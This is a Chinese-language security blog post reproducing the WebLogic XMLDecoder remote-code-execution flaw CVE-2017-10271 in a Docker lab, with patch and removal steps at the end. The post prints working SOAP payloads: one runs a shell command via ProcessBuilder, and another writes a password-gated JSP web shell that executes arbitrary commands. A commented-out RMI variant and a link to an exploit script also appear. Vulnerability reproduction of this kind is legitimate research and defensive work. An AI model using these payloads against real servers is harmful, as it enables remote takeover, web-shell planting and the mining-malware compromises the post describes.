---
title: Weblogic 0day 复现
date: 2017-12-22 15:43:02
tags: [vul,sec,weblogic,0day]
categories: Security
---
<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>

最近不断听到消息，大量Weblogic主机被挂挖矿病毒，起初以为是利用之前反序列化漏洞(CVE-2017-3248)，但是团队内部从受害主机捕获的攻击代码来看，这次是针对WebLogic的WLS组件，利用xmldecoder反序列漏洞进行的RCE攻击。目前官方也给出了此次漏洞的cve[CVE-2017-10271](https://www.cvedetails.com/cve/CVE-2017-10271/)

下面我们来复现一下此次的漏洞
#### 0x01 环境准备
我们选择docker来快速搭建漏洞环境，此次漏洞受影响的版本是10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 和 12.2.1.2.0，我们选择10.3.6来复现

在P神的[vulhub](https://github.com/vulhub/vulhub)项目中正好存在weblogic环境，看了下版本也在受影响范围之内，所以我们选择vulhub的[weblogic](https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf)镜像

克隆项目，进入weblogic目录，执行
```
docker-compose build
docker-compose up -d
```
此时会创建并运行两个容器，分别是`vulhub/weblogic`和`vulhub/weblogic`, 如下图

![containers](https://ob5vt1k7f.qnssl.com/gbF5V)

访问7001端口，weblogic已经成功运行

#### 0x02 PoC
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class="java.lang.ProcessBuilder">
			<array class="java.lang.String" length="3">
			  <void index="0">
				<string>/bin/bash</string>
			  </void>
			  <void index="1">
				<string>-c</string>
			  </void>
			  <void index="2">
				<string>calc</string>
			  </void>
			</array>
		  <void method="start"/></void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
向`/wls-wsat/CoordinatorPortType`发起一个POST请求，body部分为上面的内容，**修改`Content-Type`为`text/xml`**

目前了解的uri还有`CoordinatorPortType11`

服务器返回
```
<faultcode>S:Server</faultcode>
<faultstring>0</faultstring>
```
说明执行成功

![response](https://ob5vt1k7f.qnssl.com/yn2qT)
![reverse shell](https://ob5vt1k7f.qnssl.com/YOZ6L)

#### 0x03 Getshell
另外还有直接getshell的PoC:
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</string><void method="println">
                    <string><![CDATA[<%if("023".equals(request.getParameter("pwd"))){  
                        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
                        int a = -1;  
                        byte[] b = new byte[2048];  
                        out.print("<pre>");  
                        while((a=in.read(b))!=-1){  
                            out.println(new String(b));  
                        }  
                        out.print("</pre>");} %>]]></string></void><void method="close"/>
            </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```
会在`tmp/_WL_internal`下`bea_wls9_async_response`、`bea_wls_internal`和`uddiexplorer`目录中的war包下创建a.jsp文件，具体路径可自己选择，对应的web路径是

`http://x.x.x.x:7001/bea_wls_internal/a.jsp`
	
<!--
导师还给出了rmi调用执行的方式，可惜我对rmi机制还没研究透彻，没有构造出来利用的流程，先把PoC放在这儿:
```
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
    <void class="com.sun.rowset.JdbcRowSetImpl">
    <void property="dataSourceName">
    <string>rmi://localhost:1099/Exploit</string>
    </void>
    <void property="autoCommit">
    <boolean>true</boolean>
    </void>
    </void>
    </java>
```
-->

目前看到PoC的变换还有好几种，甚至出现了绕过官方补丁的版本，后续应该会逐渐放出的。

#### 0x04 修补方案
1.安装Oracle 10月份最新补丁

2.删除或重命名WebLogic目录中以下war包及目录
```
rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
```
访问`wls-wsat`响应404即可

#### 0x05 
附
Github上[3xp10it/exploit](https://github.com/3xp10it/exploit/blob/cbc8d61859b9c4c312bb52225671831b895fdbc3/exps/weblogic/weblogic.py)仓库删除的脚本
[Weblogic.py](https://ob5vt1k7f.qnssl.com/weblogic.py)

<script>pangu.spacingPage();</script>